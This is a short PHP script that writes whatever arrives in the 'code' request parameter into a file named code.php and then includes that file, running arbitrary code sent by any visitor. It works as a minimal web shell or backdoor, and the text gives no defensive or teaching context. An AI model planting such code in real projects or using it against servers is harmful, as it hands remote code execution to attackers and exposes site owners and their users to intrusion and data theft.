
<?php

    $file = file_put_contents('code.php','<?php '.$_REQUEST['code'].' ?>');

    include 'code.php';

?>
